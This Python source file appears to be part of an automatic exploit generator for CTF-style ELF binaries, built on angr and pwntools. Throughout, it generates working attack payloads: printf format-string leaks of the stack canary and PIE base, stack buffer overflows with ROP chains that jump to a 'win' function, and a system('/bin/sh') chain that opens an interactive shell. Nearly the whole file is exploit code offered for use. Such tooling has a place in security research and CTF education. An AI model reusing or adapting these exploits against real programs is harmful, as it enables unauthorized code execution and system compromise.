import angr
import os.path
import subprocess
from dataclasses import dataclass
from goals import Goal, SystemFunction, WinFunction
from pwnlib.util.packing import p64
from pwnlib.tubes.process import process
from pwnlib.rop.rop import ROP
from vulns import (
    Vulnerability,
    StackBufferOverflow,
    WinFunctionCall,
    UnconstrainedPrintf,
    BufferWrite,
)
from binary import Binary
from typing import Optional
from constants import PROCESS_STDOUT_WAIT_TIMEOUT


@dataclass
class ExploitError(Exception):
    message: str


@dataclass
class Section:
    start: int
    end: int
    file: Optional[str]


@dataclass
class Leak:
    canary: int
    executable_base_address: int


    def __repr__(self) -> str:
        return f"""canary = 0x{self.canary:x}
executable base address = 0x{self.executable_base_address:x}"""


@dataclass
class PrintfLeakPayload:
    payload: bytes
    leaks_canary: bool
    leaks_pie: bool
    pie_leak_offset: int


    def extract_leak(self, leak: bytes) -> Leak:
        leak_parts = leak.split(b"0x", maxsplit=1)[-1].split(b"\n")[0].split(b".")
        i = 0
        canary = None
        executable_base_address = None
        if self.leaks_canary:
            canary = int(leak_parts[i], 16)
            i += 1
        if self.leaks_pie:
            pie_leak = int(leak_parts[i], 16)
            executable_base_address = pie_leak - self.pie_leak_offset
        return Leak(canary, executable_base_address)


def exploit(binary: Binary, goals: list[Goal], vulns: list[Vulnerability]) -> Optional[bytes]:
    leak_payload: Optional[PrintfLeakPayload] = None
    if binary.canary or binary.pie:
        leak_payloads = gen_leak_payloads(binary, vulns)
        if len(leak_payloads) == 0:
            raise ExploitError("Failed to generate stack canary and/or PIE leak payload")
        leak_payload = leak_payloads[0]

    for goal in goals:
        print(f"Current goal: {goal}")
        try:
            p = process(
                os.path.abspath(binary.path), cwd=os.path.dirname(binary.path)
            )

            # Leaks required values from memory
            leak = None
            if leak_payload is not None:
                p.send(leak_payload.payload)

                # recvall with a timeout but it doesn't force close the connection
                with p.local(PROCESS_STDOUT_WAIT_TIMEOUT):
                    try:
                        while True:
                            if not p._fillbuffer():
                                break
                    except EOFError:
                        pass
                out = p.buffer.get()

                # Extract leaks.
                leak = leak_payload.extract_leak(out)
                print(leak)

            # Compute final payload stage
            payload, style = gen_payload(binary, goal, vulns, leak)
            p.sendline(payload)

            if style == "print_flag":
                out = p.recvall()
                p.close()

                if b"flag" in out:
                    return out
                else:
                    print(f"Program outputted: {out}")
                    exit_code = p.poll()
                    print(f"Exit code: {exit_code}")
            elif style == "shell":
                p.interactive()
                p.close()
                return None
            else:
                print(f"Unknown exploit style '{style}'")
                p.interactive()
                p.close()
            print("Exploit didn't print flag. Trying next goal.\n")
        except ExploitError as e:
            raise ExploitError(f"Failed to achieve goal: {e}")

    raise ExploitError("No solvable goals")


def gen_leak_payloads(binary: Binary, vulns: list[Vulnerability]) -> list[PrintfLeakPayload]:
    res = []
    for vuln in vulns:
        if not isinstance(vuln, UnconstrainedPrintf):
            continue
        res.append(gen_printf_payload(binary, vuln))
    return res


def gen_printf_payload(binary: Binary, vuln: UnconstrainedPrintf) -> PrintfLeakPayload:
    state = vuln.state.copy()
    stack_size = state.solver.eval(state.regs.rbp - state.regs.rsp)
    base_index = stack_size // 8
    canary_index = base_index + 5
    pie_leak_index = base_index + 7
    format_string = b""
    if binary.canary:
        format_string += f"%{canary_index}$p.".encode()
    if binary.pie:
        format_string += f"%{pie_leak_index}$p.".encode()
    format_string += b"\x00"

    rdi = state.regs.rdi
    constraint = format_string == state.memory.load(rdi, len(format_string))
    if not state.solver.satisfiable(extra_constraints=[constraint]):
        raise ExploitError(f"Failed to constrain printf input to {format_string}")
    state.solver.add(constraint)
    payload = get_satisfying_input(state)

    proc_map_start_delim = "--START PROC MAPPING--"
    proc_map_end_delim = "--END PROC MAPPING--"
    stack_dump_end_delim = "--END STACK DUMP--"
    script = f"""b *(0x0000555555554000 + {vuln.addr})
commands 1
    printf "{proc_map_start_delim}\\n"
    info proc mappings
    printf "{proc_map_end_delim}\\n"
    x/40gx $rsp
    printf "{stack_dump_end_delim}\\n"
    exit
end

run"""

    script_file = "script.gdb"
    with open(script_file, "w") as f:
        f.write(script)

    p = subprocess.Popen(["gdb", "--batch", f"--command={script_file}", "--args", binary.path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, _ = p.communicate(payload)

    stdout = stdout.decode()
    parts = stdout.split(proc_map_start_delim + "\n")[1].split(stack_dump_end_delim)[0].split(proc_map_end_delim + "\n")
    proc_map = parts[0].splitlines()[4:]
    stack_dump = parts[1].splitlines()

    sections = []
    for line in proc_map:
        parts = line.split(" ", maxsplit=3)
        start = int(parts[0], 16)
        end = int(parts[1], 16)
        file_parts = parts[3].strip().split(" ", maxsplit=1)[1].strip().split(" ", maxsplit=1)
        if len(file_parts) > 1:
            file = file_parts[1].strip()
        else:
            file = None
        sections.append(Section(start, end, file))

    values = []
    for line in stack_dump:
        parts = line.split(":\t", maxsplit=1)[1].split("\t")
        values += [int(part, 16) for part in parts]

    pie_leak_offset = None
    pie_leak_addr_offset = None
    for i, value in enumerate(values):
        file = None
        for section in sections:
            if value >= section.start and value < section.end:
                file = section.file
                break
        if file == os.path.abspath(binary.path):
            pie_leak_offset = i
            pie_leak_addr_offset = value - sections[0].start
            break

    if pie_leak_offset is None:
        raise ExploitError("Failed to find correct leak offset for defeating PIE")

    format_string = b""
    if binary.canary:
        format_string += f"%{canary_index}$p.".encode()
    if binary.pie:
        format_string += f"%{6 + pie_leak_offset}$p.".encode()
    format_string += b"\x00"

    state = vuln.state.copy()

    rdi = state.regs.rdi
    constraint = format_string == state.memory.load(rdi, len(format_string))
    if not state.solver.satisfiable(extra_constraints=[constraint]):
        raise ExploitError(f"Failed to constrain printf input to {format_string}")
    state.solver.add(constraint)
    payload = get_satisfying_input(state)

    return PrintfLeakPayload(
        payload,
        binary.canary,
        binary.pie,
        pie_leak_addr_offset
    )


def gen_payload(
    binary: Binary, goal: Goal, vulns: list[Vulnerability], leak: Optional[Leak]
) -> tuple[bytes, str]:
    if isinstance(goal, WinFunction):
        return (gen_win_function_payload(binary, goal, vulns, leak), "print_flag")
    if isinstance(goal, SystemFunction):
        return (gen_system_function_payload(binary, goal, vulns), "shell")

    raise ExploitError(f"Cannot generate payload for {goal}")


def gen_win_function_payload(
    binary: Binary, goal: WinFunction, vulns: list[Vulnerability], leak: Optional[Leak]
) -> bytes:
    for vuln in vulns:
        if isinstance(vuln, StackBufferOverflow):
            return gen_stack_buffer_overflow_payload(binary, vuln, goal, leak)
        elif isinstance(vuln, WinFunctionCall):
            return get_satisfying_input(vuln.state)

    raise ExploitError(
        "Payload generation requires a StackBufferOverflow or WinFunctionCall vulnerability"
    )


# Assumes that the binary's base address is 0 cause that's what we do.
def rebase(addr: int, leak: Optional[Leak]):
    if leak is None:
        return addr
    else:
        return addr + leak.executable_base_address


def gen_stack_buffer_overflow_payload(
    binary: Binary, vuln: StackBufferOverflow, goal: WinFunction, leak: Optional[Leak]
) -> bytes:
    if binary.pie:
        binary.elf.address = leak.executable_base_address
    rop = ROP(binary.elf)
    gadget = rop.find_gadget(["ret"])
    input = vuln.state.solver.eval(
        vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes
    )
    binary.elf.address
    payload = input
    print(f"goal = 0x{rebase(goal.addr, leak):x}")
    if binary.canary:
        payload += (
            b"A" * (vuln.saved_rip_offset - 16)
            + p64(leak.canary)
            + b"B" * 8
            + p64(gadget.address)
            + p64(rebase(goal.addr, leak))
        )
    else:
        payload += b"A" * vuln.saved_rip_offset + p64(gadget.address) + p64(goal.addr)
    if vuln.max_write_size is not None and len(payload) > vuln.max_write_size:
        raise ExploitError("Payload exceeds vulnerability max write size")
    return payload


def get_satisfying_input(state: angr.SimState) -> bytes:
    # Angr leaves off newlines for some reason (I think...)
    return (
        state.solver.eval(
            state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
        )
        + b"\n"
    )


def gen_win_function_call_payload(
    binary: Binary, vuln: WinFunctionCall, goal: Goal
) -> bytes:
    return vuln.state.solver.eval(
        vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes
    )


def gen_system_function_payload(
    binary: Binary, goal: SystemFunction, vulns: list[Vulnerability]
) -> bytes:
    buffer_write: BufferWrite | None = next(
        (
            vuln
            for vuln in vulns
            if isinstance(vuln, BufferWrite) and vuln.buffer_type == "Global"
        ),
        None,
    )
    if buffer_write is None:
        raise ExploitError("No global buffer to write to")
    if buffer_write.buffer_len is not None and buffer_write.buffer_len < 8:
        raise ExploitError("Buffer too small")

    options = angr.options.unicorn
    options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
    base_state = binary.angr.factory.full_init_state(
        add_options=options, stdin=angr.SimFile
    )
    simgr = binary.angr.factory.simulation_manager(base_state)
    simgr.explore(find=buffer_write.instruction_addr)

    write_bin_sh_state = simgr.found[0]
    for vuln in vulns:
        if not isinstance(vuln, StackBufferOverflow):
            continue
        simgr = binary.angr.factory.simulation_manager(write_bin_sh_state.copy())
        simgr.explore(find=buffer_write.instruction_addr)
        for state in simgr.found:
            input = state.solver.eval(
                state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
            )
            if len(input) > 0:
                input += b"\n"

            rop = ROP(binary.elf)

            ret = rop.find_gadget(["ret"]).address
            rop.raw(ret)

            rop.call(goal.addr, [buffer_write.buffer_addr])

            return b"/bin/sh\n" + input + b"A" * vuln.saved_rip_offset + rop.chain()

    raise ExploitError(f"Cannot generate payload for {goal}")
